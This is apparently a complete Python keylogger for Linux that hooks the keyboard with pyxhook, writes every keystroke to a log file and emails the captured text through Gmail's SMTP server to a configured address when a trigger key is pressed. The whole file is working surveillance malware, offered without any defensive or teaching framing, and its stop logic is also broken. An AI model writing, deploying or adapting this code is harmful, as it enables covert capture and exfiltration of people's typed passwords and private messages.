__author__ = "IrrelevantPenguin"
# Inspired by https://github.com/WilsonKoder111/PieLogger

import sys, time
import smtplib
import pyxhook # This is the linux version of pyhook

# Email config
smtp_server = 'smtp.gmail.com:587'
username = "email@address.com"
password = "password"
from_addr = "email@address.com"
to_addr = "email@address.com"
email_body = ""

log_file_path = "/path/to/log.txt"

def key_pressed(event):
    with open(log_file_path, "a") as log_file: # Save all the key presses in a file
        log_file.write(chr(event.Ascii))
    with open(log_file_path, "r") as file_to_read: # Use the log file as the email body
        email_body =  '"' + str(file_to_read.read()) + '"'
    if event.Ascii == 0: # If backspace is pressed then send an email
        send_email(username, password, from_addr, to_addr, email_body)
        global running # These 2 lines will stop the program. Remove these if you want it to continue forever
        running = False
        
def send_email(username, password, from_addr, to_addr, email_body):
    server = smtplib.SMTP(smtp_server)
    server.starttls()
    server.login(username,password)
    server.sendmail(from_addr,to_addr,email_body)

def main():
    # Set up the Hooks to detect Key Down events
    hook_manager = pyxhook.HookManager()
    hook_manager.KeyDown = key_pressed # connect the KeyDown event to our function
    hook_manager.HookKeyboard()
    hook_manager.start()
    
    running = True
    while running: # Create a loop so the program doesn't close
        time.sleep(0.1)
    
    hook_manager.cancel()

if __name__ == "__main__":
    main()
